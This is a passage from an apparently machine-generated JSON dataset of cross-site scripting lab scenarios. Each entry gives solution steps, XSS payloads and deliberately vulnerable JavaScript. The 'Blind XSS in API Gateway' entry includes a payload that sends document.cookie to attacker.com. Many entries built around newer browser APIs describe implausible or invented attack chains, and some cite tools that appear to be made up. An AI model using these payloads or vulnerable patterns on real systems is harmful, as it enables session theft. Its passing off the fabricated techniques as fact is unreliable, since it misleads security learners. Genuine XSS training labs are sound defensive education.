      "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndocument.getElementById('exports').innerHTML = \n  JSON.stringify(component.exports); // Vulnerable"
    },
    {
      "Lab scenario": "CSS Scope XSS in Design System Builder",
      "Lab Description": "UI toolkit implements @scope rules with unsafe selector concatenation. The application allows user-defined scope roots via template literals. To solve: Break style encapsulation to inject global <style> blocks.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify scope boundary via DevTools",
        "Craft payload: @scope ([attr^=\"</style><script>\"]) { ... }",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with :has() selector polyfill",
        "Verify through theme preview rendering"
      ],
      "payloads": [
        "@scope (\\3C script\\3E) to (*) { :scope { color: red; } }",
        "[attr^='</style><svg onload=alert(1)>'] { --x: ; }"
      ],
      "srcCode": "const styles = `@scope (${userSelector}) { /* ... */ }`;\ndocument.adoptedStyleSheets = [new CSSStyleSheet().replace(styles)];"
    },
    {
      "Lab scenario": "Import Attributes XSS in Plugin Architecture",
      "Lab Description": "Modular app framework processes dynamic imports with user-controlled assertions. The application uses import(module, { assert }) without validation. To solve: Hijack module loading via crafted type assertions.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept import() call via Service Worker",
        "Craft payload: import('./malicious.js', { assert: { type: 'text/html' } })",
        "Bypass MIME checks using import maps fallback",
        "Automate with Playwright module interception",
        "Verify through dependency graph visualization"
      ],
      "payloads": [
        "import('data:text/javascript,alert(1)', {assert:{type:'css'}})",
        "new Worker('data:text/javascript,alert(1)', {type:'module'})"
      ],
      "srcCode": "const module = await import(userPath, \n  JSON.parse(userAssertions)); // Vulnerable"
    },
    {
      "Lab scenario": "Shared Element Transition XSS in Documentation Viewer",
      "Lab Description": "Knowledge base implements view transitions with unsafe pseudo-element naming. The application allows user-controlled viewTransitionName values. To solve: Inject HTML through ::view-transition-group(*) selectors.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify transition targets via Rendering panel",
        "Craft payload: view-transition-name: </style><script>alert(1)</script>",
        "Bypass CSS sanitizer using Unicode escapes",
        "Chain with @starting-style rules",
        "Verify through cross-document transitions"
      ],
      "payloads": [
        "::view-transition-group(\\3C script\\3E) { content: \"\" }",
        "view-transition-name: \\3C script\\3E alert(1)"
      ],
      "srcCode": "document.startViewTransition(() => {\n  document.getElementById('content').style.viewTransitionName = userInput;\n});"
    },
    {
      "Lab scenario": "WebSocket Compression XSS in Real-Time Dashboard",
      "Lab Description": "Monitoring tool implements permessage-deflate with unsafe context takeover. The application processes fragmented messages via innerHTML accumulation. To Solve: Bypass message validation using zlib dictionary poisoning.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WS handshake with Burp Suite",
        "Craft payload: permessage-deflate; client_max_window_bits=15",
        "Bypass fragmentation checks using sliding window reuse",
        "Automate with Python websockets compression API",
        "Verify through metric visualization"
      ],
      "payloads": [
        "0b00001000 0b11111101 0b00000000 (Deflate block with <script>)",
        "ws.send(new Uint8Array([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E]))"
      ],
      "srcCode": "const ws = new WebSocket(url, ['permessage-deflate']);\nws.onmessage = (e) => {\n  outputDiv.innerHTML += await e.data.text(); // Vulnerable\n};"
    },
    {
      "Lab scenario": "WebGPU Shader Storage Buffer XSS in Scientific Visualization",
      "Lab Description": "Molecular visualization tool maps GPU storage buffers to DOM elements without validation. The application uses @compute shaders to process user-uploaded datasets. To solve: Corrupt buffer data to inject HTML payloads via shared memory mapping.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze buffer bindings via WebGPU Inspector",
        "Craft payload: [[group(2), binding(0)]] var<storage> x: array<u32> = [0x3C, 0x73, 0x63];",
        "Bypass bounds checks using variable workgroup sizes",
        "Chain with timestamp occlusion queries",
        "Verify through 3D electron density maps"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "device.createBuffer({ mappedAtCreation: true, usage: GPUBufferUsage.STORAGE }).getMappedRange().set(new TextEncoder().encode('</canvas><script>alert(1)</script>'))",
        "[[stage(compute)]] fn main() { atomicStore(&x[0], 0x3C736372); }"
      ],
      "srcCode": "const buffer = device.createBuffer({ /* User-controlled */ });\ndocument.getElementById('visualization').innerHTML = \n  new TextDecoder().decode(buffer.getMappedRange());"
    },
    {
      "Lab scenario": "HTTP/3 DATAGRAM Frame XSS in Real-Time Sports Analytics",
      "Lab Description": "Player tracking system processes QUIC DATAGRAM frames with unsafe buffer concatenation. The application uses TextDecoderStream without validation for play-by-play updates. To solve: Inject fragmented XSS payloads through connection migration abuse.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft DATAGRAM frames using quiche library",
        "Split payload: 0x3C 0x73 0x63 (first frame), 0x72 0x69 0x70 (second frame)",
        "Bypass flow control using MAX_STREAM_DATA frames",
        "Automate with Cloudflare quiche examples",
        "Verify through live game dashboard"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "quic_send(fd, [0x3C,0x73,0x63,0x72,0x69,0x70,0x74,0x3E])",
        "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "srcCode": "quiche_conn_recv_dgram(conn, buf, buf_len, &info);\ndocument.getElementById('stats').innerHTML += \n  new TextDecoder().decode(buf);"
    },
    {
      "Lab scenario": "CSS Math Function XSS in Financial Risk Calculator",
      "Lab Description": "Quantitative analysis tool implements CSS calc() with unsafe var(--user-input) handling. The application allows mathematical expressions in CSSOM via insertRule(). To solve: Break style context through trigonometric function abuse.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify CSS injection via Computed Styles panel",
        "Craft payload: --x: sin(</style><svg/onload=alert(1)>);",
        "Bypass sanitizer using env(safe-area-inset-*)",
        "Chain with @property type validation bypass",
        "Verify through PDF report generation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "width: calc(var(--x) * 1px + </style><script>alert(1)</script>);",
        "@property --x { syntax: '<string>'; initial-value: \"\\3C script\\3E\" }"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userVars} }`);\ndocument.adoptedStyleSheets.push(sheet);"
    },
    {
      "Lab scenario": "WebCodecs Video Frame XSS in Surveillance System",
      "Lab Description": "Security camera interface processes H.265 streams with unsafe debug overlay rendering. The application injects timestamp metadata into <canvas> via innerHTML. To solve: Achieve XSS through crafted Supplemental Enhancement Information (SEI) messages.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept video stream using GStreamer",
        "Inject payload: SEI payload_byte[0x3C, 0x73, 0x63, ...]",
        "Bypass frame validation using color subsampling quirks",
        "Chain with WebGL texture uploads",
        "Verify through multi-camera grid view"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "videoFrame.copyTo(new Uint8Array([...'<script>alert(1)</script>']))",
        "timestamp: 0x3C7363726970743E (Hex for <script>)"
      ],
      "srcCode": "const decoder = new VideoDecoder({\n  output: frame => {\n    overlayDiv.innerHTML += `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "ARIA 2.0 Live Region XSS in Social Feed",
      "Lab Description": "Accessibility-first social platform implements ARIA 2.0 live regions with dangerous aria-braille* attribute handling. The application renders notifications via innerHTML without sanitization. To solve: Abuse aria-braillelabel to bypass content security policies.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger high-priority notification via API",
        "Craft payload: <div role=\"status\" aria-braillelabel=\"</div><script>alert(1)</script>\">",
        "Bypass sanitizer using Unicode bidirectional override",
        "Chain with aria-atomic=\"true\"",
        "Verify through screen reader output"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<span role=\"alert\" aria-brailleroledescription=\"<script>\">",
        "<div aria-live=\"polite\" aria-braillelabel=\"\\202E}\\202Ealert(1)//\"></div>"
      ],
      "srcCode": "function showNotification(text) {\n  liveRegion.innerHTML = `<div role=\"alert\">${text}</div>`; // Vulnerable\n}"
    },
    {
      "Lab scenario": "WebAssembly Multi-Memory XSS in Cryptocurrency Wallet",
      "Lab Description": "Blockchain wallet uses WASM multi-memory for transaction signing with unsafe memory mirroring. The application displays raw memory dumps via innerHTML during debug mode. To solve: Corrupt secondary memory instance to inject HTML payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile malicious module with wasm2wat",
        "Craft payload: (memory $xss 1 256) (data (i32.const 0) \"\\3Cscript\\3E\")",
        "Bypass memory isolation using shared-nothing linking",
        "Chain with bulk memory operations",
        "Verify via debug console memory inspection"
      ],
      "payloads": [
        "new WebAssembly.Memory({ initial: 1, maximum: 256 }).buffer.set(new TextEncoder().encode('<script>'))",
        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
      ],
      "srcCode": "const instance = await WebAssembly.instantiate(wasmBuffer, { env: { mem1, mem2 } });\ndebugConsole.innerHTML = new TextDecoder().decode(mem2.buffer);"
    },
    {
      "Lab scenario": "CSS Anchor Positioning XSS in Legal Document Editor",
      "Lab Description": "Contract drafting tool implements anchor positioning with unsafe grid-area names. The application reflects user input in CSSOM via insertRule(). To solve: Break style context through grid-template-areas injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify grid container via DevTools",
        "Craft payload: grid-template-areas: \"</style><script>alert(1)</script>\"",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with @container style queries",
        "Verify through PDF export rendering"
      ],
      "payloads": [
        "grid-template-areas: \"\\3C script\\3E alert(1) \\3C /script\\3E\"",
        "@container (width: </style><svg/onload=alert(1)>) { ... }"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`#contract { ${userStyles} }`);\ndocument.adoptedStyleSheets.push(sheet);"
    },
    {
      "Lab scenario": "Fetch Metadata Injection in SSO Flow",
      "Lab Description": "Identity provider reflects Sec-Fetch-* headers in error messages without encoding. The application uses innerHTML with server-side header logging. To solve: Bypass fetch metadata validation via request smuggling.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept OAuth flow via Burp Suite",
        "Craft payload: Sec-Fetch-Site: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
        "Bypass header normalization using HTTP/2 stream prioritization",
        "Automate with Python requests-h2",
        "Verify through login error page"
      ],
      "payloads": [
        "Sec-Fetch-User: ?1<script>alert(1)</script>",
        "Sec-Fetch-Dest: \"\\u003Cimg/src=x onerror=alert(1)\\u003E\""
      ],
      "srcCode": "app.get('/error', (req, res) => {\n  res.send(`<div>Error: ${req.headers['sec-fetch-site']}</div>`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebHID Gamepad Spoofing XSS in eSports Platform",
      "Lab Description": "Gaming leaderboard processes HID gamepad inputs with unsafe button label rendering. The application maps gamepad.buttons to DOM via innerText with CSS unescape. To solve: Spoof gamepad button labels with XSS payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Spoof gamepad using Teensy microcontroller",
        "Craft payload: \"productName\": \"\\3C script\\3E alert(1)\\u003C /script\\3E\"",
        "Bypass HID report descriptor validation",
        "Automate with WebHID polyfill",
        "Verify through live tournament dashboard"
      ],
      "payloads": [
        "{\"vendorId\":0x1234,\"productId\":0x5678,\"productName\":\"<iframe/src=javascript:alert(1)>\"}",
        "gamepad.buttons[0].label = '</div><svg onload=alert(1)>'"
      ],
      "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('controls').innerText = \n    devices[0].productName; // Vulnerable CSS unescape\n});"
    },
    {
      "Lab scenario": "SVG Filter Primitive XSS in Scientific Visualization",
      "Lab Description": "Research platform implements SVG feDisplacementMap with unsafe scale handling. The application allows user-controlled filter scales via attribute binding. To solve: Inject XSS through filter primitive chaining.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify filter application via Elements panel",
        "Craft payload: <feFuncR tableValues=\"</text><script>alert(1)</script>\"",
        "Bypass CSP using filter composition",
        "Chain with <animate> timing attacks",
        "Verify through vector field rendering"
      ],
      "payloads": [
        "<filter id='x'><feComponentTransfer><feFuncR type='table' tableValues='</script><svg/onload=alert(1)>'/></filter>",
        "<feImage href='data:text/html,<script>alert(1)</script>'/>"
      ],
      "srcCode": "const svg = `<svg>${userFilters}</svg>`;\ndocument.body.insertAdjacentHTML('beforeend', svg); // Vulnerable"
    },
    {
      "Lab scenario": "DOM-based XSS in Banking Portal PDF Generator",
      "Lab Description": "The banking portal generates transaction PDFs using untrusted input in client-side HTML-to-PDF conversion. The application directly inserts user-controlled transaction notes into PDF HTML templates without sanitization. To solve: Execute arbitrary JavaScript when users view generated PDFs in vulnerable browsers.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept PDF generation request with Burp Suite and identify injection point in 'comments' parameter",
        "Validate using OWASP ZAP DOM XSS scanner with payload: <img%20src=x%20onerror=console.log(origin)>",
        "Craft SVG payload: <svg/onload=alert(document.cookie)> and encode using UTF-7 charset",
        "Bypass Content-Type restrictions using polyglot HTML/PDF header injection",
        "Verify exploitation by checking browser console for cookie exfiltration"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<svg/onload=\"alert(1)\">",
        "<img src=x onerror=javascript:alert(document.domain)>",
        "javascript:eval(atob('YWxlcnQoJ2h0dHBzOi8vYXR0YWNrZXItY29tJyk='))"
      ],
      "srcCode": "const generatePDF = (userInput) => {\n  const htmlContent = `<html>\n    <body>\n      ${userInput}\n    </body>\n  </html>`;\n  pdf.create(htmlContent).toBuffer(() => {});\n};"
    },
    {
      "Lab scenario": "Stored XSS in IoT Device Naming Convention",
      "Lab Description": "Smart home dashboard displays device names without output encoding. The application stores user-supplied device names in MongoDB and renders them using innerHTML. To solve: Persistently execute JavaScript when administrators view device management console.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman to send PUT /api/devices/1 with malicious name payload",
        "Confirm storage via GET request and HTML source inspection",
        "Craft payload using AngularJS sandbox escape: {{constructor.constructor('alert(1)')()}}",
        "Bypass WAF restrictions using UTF-8 encoding and JS template literals",
        "Verify persistence across multiple user sessions"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<img src=x onerror=alert(`XSS`) />",
        "<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>",
        "<script>throw onerror=alert,1</script>"
      ],
      "srcCode": "app.post('/devices', (req, res) => {\n  const device = new Device({\n    name: req.body.name // Vulnerable storage\n  });\n  device.save();\n});\n\n// Client-side rendering:\ndocument.getElementById('device-name').innerHTML = deviceName;"
    },
    {
      "Lab scenario": "Mutation XSS in CMS SVG File Processing",
      "Lab Description": "Blog platform allows SVG uploads that are rendered as images. The application fails to sanitize event handlers in SVG foreignObject tags. To solve: Achieve XSS through browser parser inconsistency when rendering malicious SVG.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to fuzz SVG upload endpoint with mutation payloads",
        "Validate using Chrome DevTools DOM mutation observer",
        "Craft polyglot payload combining SVG and HTML5 parsing quirks",
        "Bypass CSP restrictions using external script loading via data: URI",
        "Confirm execution across multiple browser engines"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject><body><img src=x onerror=alert(1)></foreignObject></svg>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
      ],
      "srcCode": "app.post('/upload', (req, res) => {\n  const svgContent = req.files.svg.data.toString();\n  fs.writeFileSync(`uploads/${Date.now()}.svg`, svgContent); // No sanitization\n  res.send('File uploaded');\n});"
    },
    {
      "Lab scenario": "DOM XSS via WebSocket Message Handling",
      "Lab Description": "Real-time chat application processes WebSocket messages with unsafe DOM manipulation. The application directly appends user-controlled message content using innerHTML. To solve: Trigger XSS through crafted WebSocket messages.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept WebSocket handshake with Burp Suite",
        "Craft message with HTML payload using ws:// connection",
        "Bypass message length restrictions using chunked encoding",
        "Combine with CSRF to force victim browsers to send malicious messages",
        "Verify execution in collaborative chat sessions"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<img src=x: onerror=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<math><mtext><option><style><img src=x onerror=alert(1)></style>"
      ],
      "srcCode": "wss.on('connection', (ws) => {\n  ws.on('message', (msg) => {\n    document.getElementById('chat').innerHTML += msg; // Vulnerable\n  });\n});"
    },
    {
      "Lab scenario": "Blind XSS in API Gateway Error Logging",
      "Lab Description": "Microservice API gateway logs User-Agent headers verbatim in admin panel. The application uses unsecured ELK stack for log visualization. To solve: Achieve delayed XSS execution in Kibana interface.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify User-Agent header reflection point using curl testing",
        "Craft payload with delayed callback to attacker server",
        "Bypass header sanitization using HTTP obs-fold techniques",
        "Automate exploitation with Python requests library",
        "Monitor attacker server for successful callbacks"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "\"><script>fetch(`https://attacker.com?${document.cookie}`)</script>",
        "javascript:/*--></title></style></textarea></script><svg/onload='alert(1)'>",
        "\" onfocus=alert(1) autofocus=\""
      ],
      "srcCode": "app.use((req, res, next) => {\n  logger.info(`User-Agent: ${req.headers['user-agent']}`); // Vulnerable logging\n  next();\n});\n\n// Admin panel code:\nelasticsearch.search().then(results => {\n  res.render('logs', { logs: results }); // Unsafe rendering\n});"
    },
    {
      "Lab scenario": "Reflected XSS in E-Commerce Search Parameter Wrapping",
      "Lab Description": "Online marketplace search feature wraps user input in <h1> tags without encoding. The application uses Express.js with vulnerable res.send() for AJAX responses. To solve: Execute alert() using angle bracket injection despite server-side replacement filters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify search parameter reflection using Burp Suite's Reflector extension",
        "Bypass tag stripping using JavaScript pseudo-protocol: javascript:alert(1)//%0a",
        "Craft multi-encoding payload: %3Cimg%20src%3Dx%20onerror%3D%26%2397%3Blert%26%2313%3B(1)%3E",
        "Chain with CSP bypass using strict-dynamic nonce reuse",
        "Verify via POST-based reflection in checkout flow"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "</h1><svg/onload=alert`1`>",
        "javascript:alert(document.domain)//%0d",
        "%26%2397;lert()"
      ],
      "srcCode": "app.get('/search', (req, res) => {\n  const query = req.query.q.replace(/</g, '&lt;'); // Incomplete sanitization\n  res.send(`<h1>Results for: ${query}</h1>`);\n});"
    },
    {
      "Lab scenario": "DOM XSS via Healthcare Portal URL Fragment",
      "Lab Description": "Patient records system processes URL fragments in client-side routing. The application uses decodeURIComponent() instead of decodeURI() for fragment parsing. To solve: Achieve XSS through double-encoded hash payloads in SPA routing.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze client-side routing with browser's debugger; statement",
        "Craft payload: #<img%2520src=x%2520onerror%2520=%2520alert(1)>",
        "Bypass URL normalization using mixed encoding layers",
        "Combine with history.pushState() to trigger parser differential",
        "Verify using Edge's legacy document mode"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "#<img%20src=x%20onerror=alert(1)>",
        "javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))",
        "%2522%253E%253Cscript%253Ealert(1)%253C/script%253E"
      ],
      "srcCode": "window.addEventListener('hashchange', () => {\n  const param = decodeURIComponent(location.hash.slice(1));\n  document.getElementById('content').innerHTML = param; // Vulnerable\n});"
    },
    {
      "Lab scenario": "Stored XSS via Social Media Profile JSON-LD Injection",
      "Lab Description": "Platform allows custom profile schemas that render in <script type='application/ld+json'>. The application uses JSON.stringify() without escaping. To solve: Break JSON context and execute script via Unicode escapes.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept profile update request with Burp Suite",
        "Craft payload: </script><svg onload=alert(1)>",
        "Bypass JSON validation using escaped line terminators: \\u2028",
        "Combine with CDATA section termination patterns",
        "Verify in mobile app's WebView implementation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "\"description\": \"\\u003c/script\\u003e<img src=x onerror=alert(1)>\"",
        "{\"@context\":\"\\u0022</script><script>alert(1)//\"}",
        "\\u002d\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
      ],
      "srcCode": "app.post('/profile', (req, res) => {\n  const schema = `<script type='application/ld+json'>\n    ${JSON.stringify(req.body)}\n  </script>`; // Vulnerable\n  db.updateProfile(schema);\n});"
    },
    {
      "Lab scenario": "Mutation XSS in Hotel Booking Calendar Widget",
      "Lab Description": "Date picker component re-encodes HTML entities during DOM cloning. The application uses jQuery's .clone() with broken sanitization. To solve: Achieve XSS through parser differential between clone and innerHTML operations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify DOM clobbering vectors using Chrome's Memory tab",
        "Craft payload: <div id=<div id= x='></div><img src=x onerror=alert(1)>'",
        "Bypass jQuery's cleanData() using Object.observe polyfill",
        "Trigger mutation via rapid date selection events",
        "Confirm in Firefox's legacy innerHTML implementation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<x/><style><script>alert(1)</script>",
        "<div id=\"</div><img src=x onerror=alert(1)>\"",
        "<svg><style>{font-family:'</style><script>alert(1)</script>'}"
      ],
      "srcCode": "$('.calendar').on('click', () => {\n  const $clone = $('#template').clone();\n  $clone.html(decodeEntities(userContent)); // Broken sanitization\n  $('body').append($clone);\n});"
    },
    {
      "Lab scenario": "Blind XSS in Fitness Tracker CSV Export",
      "Lab Description": "Workout logging system embeds user input in CSV files using Excel-style formula injection. The application uses res.csv() without proper escaping. To solve: Achieve XSS when admin opens exported file in vulnerable spreadsheet software.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify CSV injection point using formula: =1+1",
        "Craft payload: =HYPERLINK(\"javascript:alert(1)\", \"Click\")",
        "Bypass CSV quoting using tab-separated values",
        "Chain with DDE payloads for Office 2016",
        "Verify via file download and LibreOffice rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "=HYPERLINK(\"javascript:alert(document.domain)\",\"Malicious Link\")",
        "@@=1-1=alert(1)-1",
        "=1|'\"&&alert(1)&&'"
      ],
      "srcCode": "app.get('/export', (req, res) => {\n  const csv = userData.map(d => `${d.date},${d.exercise},${d.notes}`).join('\\n');\n  res.csv(csv); // No output encoding\n});"
    },
    {
      "Lab scenario": "XSS via WebAssembly Module Injection in Video Processing App",
      "Lab Description": "Video editing platform dynamically loads WebAssembly modules from user-uploaded files. The application fails to validate imported WASM memory operations. To solve: Achieve arbitrary JavaScript execution through malicious memory pointer manipulation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Reverse-engineer default WASM module using WasmFiddle",
        "Inject malicious memory export: (export \"memory\" (memory $malicious 1 256))",
        "Craft HTML/JS loader exploiting shared ArrayBuffer",
        "Bypass Content Security Policy using wasm-unsafe-eval directive",
        "Verify memory corruption through DevTools Memory Inspector"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "wasmCompile(`(module (memory (export \"memory\") 1 256) (func (export \"exploit\") (i32.store (i32.const 0) (i32.const 0x41414141))))`);",
        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQBBAn8BQQoAGgAKAA=="
      ],
      "srcCode": "const wasmInstance = await WebAssembly.instantiate(userUploadedBuffer, {\n  env: {\n    memory: new WebAssembly.Memory({ initial: 1 })\n  }\n});\nconsole.log('WASM initialized:', wasmInstance.exports); // Debug logging"
    },
    {
      "Lab scenario": "Shadow DOM XSS Escape in Project Management Dashboard",
      "Lab Description": "Task management system uses closed shadow roots for card descriptions. The application implements broken sanitization through DOMPurify before shadow DOM injection. To solve: Break shadow boundary containment through prototype pollution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify shadow root usage via Chrome's Element Inspector",
        "Craft payload: {constructor: {prototype: {shadowRootAccess: true}}}",
        "Bypass sanitizer using Object.defineProperty() injection",
        "Chain with attachShadow override polyglot",
        "Verify cross-browser compatibility (Chrome/Firefox)"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<div id='x'><template shadowroot='open'><slot></slot></template><script>parent.document.write('<img src=x onerror=alert(1)>'</script></div>",
        "{{ Object.defineProperty(Element.prototype, 'shadowRoot', {get: () => document}) }}"
      ],
      "srcCode": "const card = document.createElement('div');\ncard.attachShadow({ mode: 'closed' });\ncard.shadowRoot.innerHTML = sanitize(userInput); // Broken sanitization\nconsole.error('Shadow DOM init failed:', error); // Verbose logging"
    },
    {
      "Lab scenario": "Service Worker Persistent XSS in Progressive Web App",
      "Lab Description": "News aggregator PWA registers service workers from unvalidated user-controlled URLs. The application implements insecure 'serviceworker-allowed' header configuration. To solve: Establish permanent XSS through cached response manipulation.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify SW registration endpoint via Network tab",
        "Craft malicious worker: self.addEventListener('fetch', e => e.respondWith(new Response('<script>alert(1)</script>')))",
        "Bypass scope restrictions using path traversal in register()",
        "Automate cache poisoning with OWASP ZAP's SW Fuzzer",
        "Verify persistence across browser restarts"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "navigator.serviceWorker.register('/malicious-sw.js', { scope: '/' })",
        "self.importScripts('data:,self.onfetch=()=>new Response(\"<script>alert(1)</script>\")');"
      ],
      "srcCode": "app.get('/register-sw', (req, res) => {\n  const swUrl = req.query.url;\n  res.header('Service-Worker-Allowed', '/');\n  res.json({ url: swUrl }); // Insecure registration\n});"
    },
    {
      "Lab scenario": "WebRTC Data Channel XSS in Telemedicine Platform",
      "Lab Description": "Video conferencing system transmits SDP offers through unescaped DOM updates. The application uses simple-peer with vulnerable SDP parser. To solve: Inject JavaScript through crafted ICE candidate messages.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture WebRTC handshake using Wireshark",
        "Craft malicious SDP: a=candidate:1 1 udp 2113929216 <img/src=x onerror=alert(1)> 1234",
        "Bypass SDP parser using line wrapping and whitespace",
        "Combine with STUN/TURN server reflection attacks",
        "Verify through peer connection state changes"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "a=ice-ufrag:%3Cscript%3Ealert(1)%3C/script%3E",
        "o=- 0 0 IN IP4 127.0.0.1\ns=<img/src=x onerror=alert(document.domain)>\nt=0 0"
      ],
      "srcCode": "peer.on('signal', data => {\n  document.getElementById('sdp').innerHTML = \n    `SDP: ${JSON.stringify(data)}`; // Vulnerable display\n});"
    },
    {
      "Lab scenario": "PWA Cache Poisoning XSS via Finance Dashboard",
      "Lab Description": "Stock trading PWA caches API responses with vulnerable Cache-Control headers. The application uses stale-while-revalidate strategy without validation. To solve: Poison cache to serve malicious JavaScript from /api/prices endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify cacheable routes via Lighthouse audits",
        "Craft JSONP-style response: )]}',\n{\"data\": \"<script>alert(1)</script>\"}",
        "Bypass MIME type checks using byte-order marks",
        "Automate with Postman Interceptor and cache timing attacks",
        "Verify through offline mode exploitation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: public, max-age=31536000\n\n{\"payload\": \"</script><svg onload=alert(1)>\"}",
        "for(;;);{\"response\": \"<img src=x onerror=alert(document.cookie)>\"}"
      ],
      "srcCode": "self.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request)\n      .then(cached => cached || fetch(event.request))\n  ); // No validation\n});"
    },
    {
      "Lab scenario": "WebGL Shader Injection XSS in AR Platform",
      "Lab Description": "Augmented reality viewer processes 3D model vertex shaders from user uploads. The application converts GLSL code to JS through unsafe eval() optimization. To solve: Achieve JS execution via GLSL preprocessor directives and shader linking.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Decompile default shader using WebGL Inspector",
        "Inject payload: #define GL_FRAG_COLOR alert(1);//",
        "Bypass shader validation using OpenGL ES 3.0 quirks",
        "Chain with ANGLE_instanced_arrays extension abuse",
        "Verify through GPU memory dumps"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "#pragma optimize(off)\nprecision highp float;\nvoid main() { discard; alert(1); }",
        "vec4 _main() { return vec4(1.0, webgl_domain, 1.0); }"
      ],
      "srcCode": "const compileShader = (code) => {\n  const optimized = code.replace(/precision\\s+\\w+/g, '');\n  eval(`function shader() { ${optimized} }`); // Debug mode\n};"
    },
    {
      "Lab scenario": "WebSocket Bidirectional XSS in Multiplayer Game Lobby",
      "Lab Description": "Browser-based game uses raw WebSocket.send() for chat and game state. The application mirrors messages between players with vulnerable JSON.parse(JSON.stringify()) pattern. To solve: Achieve XSS through prototype pollution in circular reference handling.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept WebSocket traffic using Burp Suite's WS Catcher",
        "Craft circular reference payload: {__proto__: {isAdmin: true, toString: ()=>alert(1)}}",
        "Bypass message size limits using DEFLATE compression",
        "Combine with WebSocket permessage-deflate extension",
        "Verify through player state synchronization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
        "JSON.parse('{\"constructor\":{\"prototype\":{\"eval\":\"alert(1)\"}}')"
      ],
      "srcCode": "ws.on('message', (data) => {\n  const parsed = JSON.parse(JSON.stringify(data));\n  broadcast(parsed); // Prototype pollution\n});"
    },
    {
